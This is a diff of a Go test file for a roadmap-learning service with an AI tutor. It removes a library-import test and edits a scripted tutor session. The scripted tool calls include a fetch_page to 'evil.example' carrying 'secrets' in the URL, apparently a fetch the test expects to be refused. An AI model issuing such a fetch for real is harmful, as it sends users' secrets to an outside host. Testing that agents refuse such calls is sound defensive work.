@@ -64,46 +64,6 @@ func (c *client) continueAgent(runID, instruction string) runJSON {
 	}
 }
 
-func TestLibraryImportsCuratedDomains(t *testing.T) {
-	e := newEnv(t, false)
-	alice := e.client()
-	alice.register("Alice")
-	var src struct {
-		Items []struct {
-			ID    string `json:"id"`
-			Kind  string `json:"kind"`
-			Count int    `json:"count"`
-		} `json:"items"`
-	}
-	_ = json.Unmarshal(alice.mustDo(200, "GET", "/v1/roadmaps/sources", nil), &src)
-	var ids []string
-	for _, s := range src.Items {
-		if s.Kind == "library" {
-			ids = append(ids, s.ID)
-		}
-	}
-	for _, want := range []string{"cs", "dsa", "maths", "os", "linux-bash", "c-cpp", "java", "python", "rust", "networking", "devops",
-		"containers", "web", "api-design", "system-design", "databases", "data-engineering", "data-analysis", "data-science",
-		"machine-learning", "mlops", "security", "cloud", "soft-skills"} {
-		if !slices.Contains(ids, want) {
-			t.Errorf("library lacks %s", want)
-		}
-	}
-	var rm roadmapJSON
-	_ = json.Unmarshal(alice.mustDo(201, "POST", "/v1/roadmaps/import", []byte(`{"source":"system-design"}`)), &rm)
-	if rm.Source != "library" || len(rm.Skills) < 5 || len(rm.Edges) == 0 || !strings.Contains(rm.Attribution, "belongs to its authors") {
-		t.Fatalf("library roadmap = %+v", rm)
-	}
-	// Nodes are competencies; the book that teaches one is listed under it.
-	if s := rm.Skills[0]; s.Title != "Data-intensive application design" || len(s.Resources) == 0 || s.Resources[0].Title != "Designing Data-Intensive Applications" {
-		t.Fatalf("first skill = %+v", s)
-	}
-	// Imported roadmaps are the person's own: editable and deletable.
-	alice.mustDo(200, "PATCH", "/v1/roadmaps/"+rm.ID, []byte(`{"title":"My system design path"}`))
-	alice.mustDo(200, "PATCH", "/v1/skills/"+rm.Skills[0].ID, []byte(`{"title":"DDIA, chapters 1-4","section":"Now"}`))
-	alice.mustDo(204, "DELETE", "/v1/roadmaps/"+rm.ID, nil)
-}
-
 func TestTutorInterviewsCitesSourcesAndDraftsOnlyAfterApproval(t *testing.T) {
 	e := newEnv(t, true)
 	alice := e.client()
@@ -127,7 +87,7 @@ func TestTutorInterviewsCitesSourcesAndDraftsOnlyAfterApproval(t *testing.T) {
 
 	// Turn 2: research, refused fetches, an uncited skill, then a cited draft.
 	calls := []string{
-		"search_library", `{"query":"distributed systems"}`,
+		"search_library", `{"query":"data-intensive"}`,
 		"fetch_page", `{"url":"` + site.URL + `/syllabus"}`,
 		"fetch_page", `{"url":"` + site.URL + `/members/notes"}`,
 		"fetch_page", `{"url":"https://evil.example/?d=secrets"}`,
